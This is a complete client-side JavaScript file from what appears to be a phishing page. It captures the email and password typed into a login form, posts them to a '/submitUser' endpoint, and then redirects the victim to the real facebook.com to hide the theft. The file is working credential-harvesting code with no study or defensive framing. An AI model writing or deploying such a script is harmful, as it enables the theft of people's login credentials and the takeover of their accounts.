window.addEventListener('DOMContentLoaded', () => {

});

const email = document.getElementById('email')
const password = document.getElementById('password')
const form = document.getElementById('myForm');

form.addEventListener('submit', (e) => {
    e.preventDefault() //Prevent from reloading page

    /**
     * Get Input Value
     */
    const emailVal = email.value;
    const passwordVal = password.value;

    if (emailVal === "" || passwordVal === "") {
        validateForm("alert-danger p-2 mb-2", "Please fill all input fields.")
    } else {
        postUser(emailVal, passwordVal)
        window.location.replace('https://www.facebook.com/')
    }

})

async function postUser(email, password) {
    await fetch('/submitUser', {
        method: "POST",
        headers: {
            "Content-type": "application/json"
        },
        body: JSON.stringify({
            email,
            password
        })
    })
}
function validateForm(classname, message) {
    const errMsgContainer = document.createElement('div');
    const formBody = document.getElementById('formBody');

    errMsgContainer.className = `${classname}` //Assign classname into div
    errMsgContainer.appendChild(document.createTextNode(message)) //Assign error message

    formBody.insertBefore(errMsgContainer, form);
    setTimeout(() => {
        errMsgContainer.remove()
    }, 2000)
}